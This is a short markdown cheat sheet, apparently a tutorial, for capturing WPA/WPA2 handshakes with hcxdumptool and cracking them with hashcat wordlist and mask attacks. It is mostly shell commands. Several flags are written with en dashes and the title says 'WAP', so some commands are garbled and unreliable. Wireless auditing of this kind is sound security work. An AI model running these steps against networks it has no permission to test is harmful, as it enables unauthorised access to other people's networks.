# Attacking WAP and WAP2 Wireless Networks Using Hcxdumptool and Hashcat

## Installation

Hcxdumptool

`sudo apt-get install hcxdumptool`

Hashcat

`sudo apt-get install hashcat`

## Commands

```
sudo systemctl stop NetworkManager.service
sudo systemctl stop wpa_supplicant.service
```

sudo hcxdumptool -i wlan0 -o dumpfile.pcapng –active_beacon –enable_status=15


```
sudo systemctl start wpa_supplicant.service
sudo systemctl start NetworkManager.service
```


```
hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
```

- "-i wlan0" specifies the wireless interface to use for capturing traffic. In this case, it's "wlan0".
- "-o dumpfile.pcapng" specifies the output file name and format for the captured traffic. In this case, it's "dumpfile.pcapng".
- "-active_beacon" enables active beacon monitoring, which means that hcxdumptool will send out probe requests to nearby access points and capture their responses.
- "-enable_status=15" enables additional information in the captured packets, including information about the access points and stations.


## Cracking

Wordlist attack with hashcat on Linux

```
hashcat -m 22000 hash.hc22000 wordlist.txt
```


Mask attack with hashcat on Windows

```
hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

hashcat.exe -m 22000 hash.hc22000 -a 3 –increment –increment-min 8 –increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d 

```

Tutorial https://www.youtube.com/watch?v=Usw0IlGbkC4&ab_channel=DavidBombal
